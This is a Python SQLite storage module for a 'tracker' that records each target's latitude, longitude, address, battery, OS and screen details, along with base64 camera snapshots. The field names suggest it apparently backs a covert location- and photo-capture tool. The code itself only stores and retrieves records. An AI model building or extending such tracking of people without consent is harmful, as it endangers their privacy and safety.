import sqlite3
from datetime import datetime

DB_NAME = "tracker.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id TEXT,
            lat REAL,
            lon REAL,
            accuracy REAL,
            source TEXT,
            time TEXT,
            address TEXT,
            battery TEXT,
            os_info TEXT,
            screen TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS snaps (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id TEXT,
            image_b64 TEXT,
            time TEXT
        )
    ''')
    conn.commit()
    conn.close()

def save_location(target_id, lat, lon, accuracy, source, time, address, battery=None, os_info=None, screen=None):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO locations (target_id, lat, lon, accuracy, source, time, address, battery, os_info, screen)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (target_id, lat, lon, accuracy, source, time, address, battery, os_info, screen))
    conn.commit()
    conn.close()

def save_snap(target_id, image_b64, time):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO snaps (target_id, image_b64, time)
        VALUES (?, ?, ?)
    ''', (target_id, image_b64, time))
    conn.commit()
    conn.close()

def get_latest_location(target_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT lat, lon, accuracy, source, time, address, battery, os_info, screen
        FROM locations
        WHERE target_id = ?
        ORDER BY id DESC LIMIT 1
    ''', (target_id,))
    row = cursor.fetchone()
    conn.close()
    if row:
        return {
            "lat": row[0],
            "lon": row[1],
            "accuracy": row[2],
            "source": row[3],
            "time": row[4],
            "address": row[5],
            "battery": row[6],
            "os_info": row[7],
            "screen": row[8]
        }
    return None

def get_latest_snap(target_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT image_b64, time
        FROM snaps
        WHERE target_id = ?
        ORDER BY id DESC LIMIT 1
    ''', (target_id,))
    row = cursor.fetchone()
    conn.close()
    if row:
        return {
            "image_b64": row[0],
            "time": row[1]
        }
    return None

init_db()
